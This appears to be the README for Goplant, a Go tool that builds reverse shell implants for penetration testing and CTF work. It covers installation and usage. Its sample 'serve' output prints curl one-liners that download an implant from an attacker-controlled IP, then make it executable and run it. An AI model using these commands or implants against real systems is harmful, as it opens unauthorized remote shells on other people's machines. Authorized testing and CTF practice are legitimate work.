
# Goplant

<center>
<img src='img/goplant_logo.png' />
</center>

Goplant generates executable reverse shell implants for pentesting and CTF. 


```bash
Goplant generates executable reverse shell implants for pentesting

Usage:
  goplant [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  generate    Generate a reverse shell implant
  help        Help about any command
  list        List available templates
  serve       Start an implant server

Flags:
  -h, --help   help for goplant

Use "goplant [command] --help" for more information about a command.
```

## Installation 

```bash
go install github.com/CamilleGR/goplant@latest
```

## Generate 

The `generate` command generate a new executable accordingly to targetted arch ans operating system. It take lhost and lport parameters as metasploit or msfvenom.

## Serve 

The serve command allows you to directly generate an implant and serve it on a web server. It reduce the number of action to get your reverse shell. 

Goplant show you some example commands to execute to download and execute your payload

```bash
goplant serve --lhost 10.10.15.144 --lport 4444 --arch amd64  --os linux
   ______      ____  __            __ 
  / ____/___  / __ \/ /___ _____  / /_
 / / __/ __ \/ /_/ / / __ `/ __ \/ __/
/ /_/ / /_/ / ____/ / /_/ / / / / /_  
\____/\____/_/   /_/\__,_/_/ /_/\__/

🪴Listen on:   http://0.0.0.0:1337/cactus

🪴 Implant : linux/amd64 --> 10.10.15.144:4444


🪴 Payloads : 
curl http://10.10.15.144:1337/cactus -O
curl http://10.10.15.144:1337/cactus -O && chmod +x cactus && ./cactus

```